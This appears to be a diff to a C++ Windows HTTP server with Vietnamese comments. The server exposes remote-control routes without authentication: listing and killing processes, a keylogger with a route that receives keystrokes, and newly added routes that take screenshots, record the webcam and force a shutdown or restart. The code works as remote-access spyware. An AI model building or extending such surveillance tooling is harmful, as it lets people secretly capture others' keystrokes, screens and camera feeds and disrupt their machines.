@@ -1,12 +1,32 @@
 #include <iostream>
 #include <winsock2.h>
 #include <windows.h>
+// Các file header hiện có của bạn
 #include "config.h"
 #include "http_utils.h"
 #include "router.h"
 #include "apps.h"
 #include "processes.h"
 #include "keylogger.h"
+
+// --- 1. THÊM HEADER WEBCAM (File bạn đã tạo trước đó) ---
+#include "webcam.h" 
+
+// --- 2. HÀM HỖ TRỢ SHUTDOWN/RESTART (Bổ sung để link trong menu hoạt động) ---
+void power_action(bool restart) {
+    HANDLE hToken; 
+    TOKEN_PRIVILEGES tkp; 
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken); 
+    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid); 
+    tkp.PrivilegeCount = 1; 
+    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
+    AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0); 
+    
+    if (restart) 
+        ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER); 
+    else
+        ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER); 
+}
 
 int main() {
     // 1. Khởi tạo Winsock
@@ -27,7 +47,7 @@ int main() {
     // 3. Bind (gán địa chỉ)
     sockaddr_in server_addr;
     server_addr.sin_family = AF_INET;
-    server_addr.sin_port = htons(PORT);
+    server_addr.sin_port = htons(PORT); // PORT lấy từ config.h hoặc define
     server_addr.sin_addr.s_addr = INADDR_ANY;
 
     if (bind(server_fd, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
@@ -55,7 +75,7 @@ int main() {
             continue;
         }
 
-        char buffer[BUFFER_SIZE];
+        char buffer[BUFFER_SIZE]; // BUFFER_SIZE lấy từ config.h hoặc define
         int bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
 
         if (bytes_received > 0) {
@@ -64,6 +84,7 @@ int main() {
             std::cout << request << "\n";
 
             std::string route;
+            // Hàm parse_request_path có thể nằm trong router.h hoặc http_utils.h
             std::map<std::string, std::string> query = parse_request_path(request, route);
             std::string response;
 
@@ -74,28 +95,58 @@ int main() {
                                      "<li><a href='/processes'>List processes</a></li>"
                                      "<li><a href='/processes/actions'>Start/Stop processes</a></li>"
                                      "<li><a href='/keylogger'>Keylogger</a></li>"
-                                     "<li><a href='/screenshoot'>Screenshoot</a></li>"
+                                     "<li><a href='/screenshot'>Screenshot</a></li>"
                                      "<li><a href='/webcam_rec'>Record webcam 10s</a></li>"
                                      "<li><a href='/shutdown'>Shutdown</a> (admin)</li>"
                                      "<li><a href='/restart'>Restart</a> (admin)</li>"
                                      "</ul>");
-            } else if (route == "/apps") {
+            } 
+            else if (route == "/apps") {
                 response = list_apps();
-            } else if (route == "/apps/start") {
+            } 
+            else if (route == "/apps/start") {
                 std::string app_name = query.count("app") ? query["app"] : "";
                 start_app(app_name);
                 response = redirect("/apps");
-            } else if (route == "/apps/stop") {
+            } 
+            else if (route == "/apps/stop") {
                 std::string app_name = query.count("app") ? query["app"] : "";
                 stop_app(app_name);
                 response = redirect("/apps");
-            } else if (route == "/processes") {
+            } 
+            else if (route == "/processes") {
                 response = list_processes();
-            } else if (route == "/keylogger") {
+            } 
+            else if (route == "/keylogger") {
                 response = keylog_control();
-            } else if (route == "/keylogger/send") {
+            } 
+            else if (route == "/keylogger/send") {
                 response = keylog_receive(query);
-            } else {
+            }
+            
+            // --- 3. LOGIC MỚI CHO WEBCAM & SCREENSHOT ---
+            else if (route == "/screenshot") {
+                // Gọi hàm từ webcam.h
+                std::string file = take_screenshot();
+                response = html_page("<h1>Screenshot Saved</h1><p>File: " + file + "</p>");
+            } 
+            else if (route == "/webcam_rec") {
+                // Gọi hàm từ webcam.h
+                std::string file = start_webcam_recording();
+                response = html_page("<h1>Recording Started</h1><p>Saving to: " + file + "</p>");
+            }
+            // --- LOGIC CHO SHUTDOWN/RESTART ---
+            else if (route == "/shutdown") {
+                power_action(false);
+                response = html_page("<h1>Shutting down...</h1>");
+            } 
+            else if (route == "/restart") {
+                power_action(true);
+                response = html_page("<h1>Restarting...</h1>");
+            }
+            // --------------------------------------------
+            
+            else {
                 response = html_page("<h1>404 Not Found</h1>");
             }
 
